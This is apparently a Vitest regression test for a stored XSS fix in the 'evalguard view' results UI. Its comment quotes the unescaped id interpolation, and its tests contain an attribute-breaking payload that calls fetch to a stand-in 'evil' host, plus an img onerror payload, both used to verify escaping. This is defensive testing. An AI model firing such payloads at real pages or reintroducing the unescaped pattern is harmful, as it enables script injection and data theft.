import { describe, expect, it } from "vitest";
import { buildHTML } from "../view.js";

/**
 * Regression: `evalguard view` served a page whose client-side renderer
 * interpolated the run `id` into markup with NO escaping —
 *
 *     '<div class="run-row" data-id="' + r.id + '">'
 *     '<span …>' + run.id + '</span>'
 *
 * — and the ids come from an `evalguard-results.json` discovered in the current
 * working directory. Cloning an untrusted repo and running `evalguard view`
 * therefore executed the repo author's JavaScript inside the local UI (stored
 * XSS), where it could read and exfiltrate every run on the machine.
 *
 * `esc()` alone is NOT sufficient in an attribute position: it escapes via
 * textContent → innerHTML, which leaves `"` and `'` intact, so a payload can
 * still close `data-id="…"` and add an event-handler attribute. `escAttr()`
 * closes that.
 */
const page = buildHTML();

/** Extract a function body from the inlined client script. */
function extractFn(name: string): string {
  const start = page.indexOf(`function ${name}(`);
  expect(start, `${name} must be defined in the served page`).toBeGreaterThan(-1);
  const open = page.indexOf("{", start);
  let depth = 0;
  for (let i = open; i < page.length; i++) {
    if (page[i] === "{") depth++;
    else if (page[i] === "}") {
      depth--;
      if (depth === 0) return page.slice(start, i + 1);
    }
  }
  throw new Error(`unbalanced braces for ${name}`);
}

/**
 * Evaluate the page's real `esc` + `escAttr` sources against a stub that models
 * the browser contract `esc` relies on: assigning textContent and reading
 * innerHTML escapes `&`, `<` and `>` — and NOT the quote characters.
 */
function loadEscapers(): { esc: (s: unknown) => string; escAttr: (s: unknown) => string } {
  const documentStub = {
    createElement: () => {
      let text = "";
      return {
        set textContent(v: string) {
          text = v;
        },
        get innerHTML() {
          return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        },
      };
    },
  };
  const factory = new Function(
    "document",
    `${extractFn("esc")}\n${extractFn("escAttr")}\nreturn { esc, escAttr };`,
  );
  return factory(documentStub);
}

describe("evalguard view — stored XSS from a repo-local results file", () => {
  it("**routes the run id through escAttr in the data-id attribute**", () => {
    expect(page).toContain(`data-id="' + escAttr(r.id) + '"`);
    // The vulnerable form must be gone.
    expect(page).not.toContain(`data-id="' + r.id + '"`);
  });

  it("escapes the run id rendered in the detail header", () => {
    expect(page).not.toMatch(/\+ run\.id \+/);
    expect(page).toContain("esc(run.id)");
  });

  it("escapes the run type badge", () => {
    expect(page).not.toMatch(/\+ r\.type \+/);
  });

  it("escAttr neutralises an attribute-breaking payload that esc does not", () => {
    const { esc, escAttr } = loadEscapers();
    const payload = `x" onmouseover=fetch('https://evil/') autofocus="`;

    // esc() is a TEXT escaper — it leaves the quote that breaks out of the
    // attribute, which is exactly why the attribute needs escAttr.
    expect(esc(payload)).toContain('"');

    const attr = escAttr(payload);
    expect(attr).not.toContain('"');
    expect(attr).not.toContain("'");
    expect(attr).toContain("&quot;");
  });

  it("escAttr also escapes markup characters", () => {
    const { escAttr } = loadEscapers();
    const out = escAttr(`<img src=x onerror=alert(1)>`);
    expect(out).not.toContain("<img");
    expect(out).toContain("&lt;img");
  });
});
